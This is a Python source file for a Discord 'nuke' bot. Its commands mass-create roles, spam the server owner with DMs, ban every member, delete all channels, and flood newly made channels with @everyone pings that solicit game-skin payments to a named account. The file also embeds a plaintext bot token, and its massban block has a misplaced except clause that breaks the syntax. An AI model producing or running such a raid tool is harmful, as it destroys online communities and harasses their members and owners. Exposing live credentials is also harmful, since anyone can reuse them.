import discord
from discord.ext import commands

#cliente
client = commands.Bot(command_prefix=">", intents=discord.Intents.all())


#evento
@client.event
async def on_ready():
  print("Logged in as {} ".format(client.user))


@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(100):
    await ctx.guild.create_role(name="CAGASTE")


@client.command()
async def ownerspam(ctx):
  owner = ctx.guild.owner
  while True:
    await owner.send("CAGASTE")


@client.command()
async def massban(ctx):
  try:
    for members in ctx.guild.members:
      await members.ban(reason="PORQUE PINTOOO")
    except:
      print(f"cant ban {members}")


#commando principal
@client.command()
async def nuke(ctx):
  await ctx.guild.edit(name="COJIDO POR CHUKOXX")
  try:
    for channels in ctx.guild.channels:
      await channels.delete()
      print("deleted {}".format(channels))
  except:
    print("cant delete {}".format(channels))

  while True:
    await ctx.guild.create_text_channel("send cs skins: santic67 ")


#pings
@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send("@everyone @here send cs skins: santic67 ")


client.run(
  "MTA4NzUzMTI4MjU0NTc4NjkyMA.GHEQ3Q._5Wl3nHAcarSQqN6UY9PMjqVeWL6RFE-9GcRgE")
